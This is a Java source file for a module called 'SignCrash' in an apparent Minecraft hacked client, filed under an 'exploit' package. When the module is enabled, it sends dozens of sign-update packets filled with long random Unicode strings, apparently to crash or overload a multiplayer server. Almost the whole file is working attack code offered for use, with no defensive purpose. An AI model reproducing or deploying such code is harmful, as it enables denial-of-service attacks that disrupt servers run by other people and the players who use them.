/*
 * Copyright (c) 2022 Coffee Client, 0x150 and contributors. All rights reserved.
 */

package vertex.client.feature.module.impl.exploit;

import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.network.packet.c2s.play.UpdateSignC2SPacket;
import vertex.client.VertexMain;
import vertex.client.feature.module.Module;
import vertex.client.feature.module.ModuleType;

import java.util.Objects;
import java.util.Random;

public class SignCrash extends Module {

    public SignCrash() {
        super("SignCrash", "Sign go brrr", ModuleType.EXPLOIT);
    }
    
    public static class RandomHelper {
        public static String rndStr(int size) {
            StringBuilder end = new StringBuilder();
            for (int i = 0; i < size; i++) {
                end.append((char) (new Random().nextInt(65) + 57));
            }
            return end.toString();
        }

        public static String rndAscii(int size) {
            StringBuilder end = new StringBuilder();
            for (int i = 0; i < size; i++) {
                end.append((char) (new Random().nextInt(25) + 97));
            }
            return end.toString();
        }

        public static String rndBinStr(int size) {
            StringBuilder end = new StringBuilder();
            for (int i = 0; i < size; i++) {
                // 65+57
                end.append((char) (new Random().nextInt(0xFFFF)));
            }
            return end.toString();
        }

        public static double rndD(double rad) {
            Random r = new Random();
            return r.nextDouble() * rad;
        }
    }

    @Override
    public void tick() {

    }

    @Override
    public void enable() {
        for (int i = 0; i < 38; i++) {
            assert VertexMain.client.player != null;
            UpdateSignC2SPacket p = new UpdateSignC2SPacket(VertexMain.client.player.getBlockPos(), RandomHelper.rndBinStr(598),
                    RandomHelper.rndBinStr(598), RandomHelper.rndBinStr(598), RandomHelper.rndBinStr(598));
            Objects.requireNonNull(VertexMain.client.getNetworkHandler()).sendPacket(p);
        }
    }

    @Override
    public void disable() {

    }

    @Override
    public String getContext() {
        return null;
    }

    @Override
    public void onWorldRender(MatrixStack matrices) {

    }

    @Override
    public void onHudRender() {

    }
}
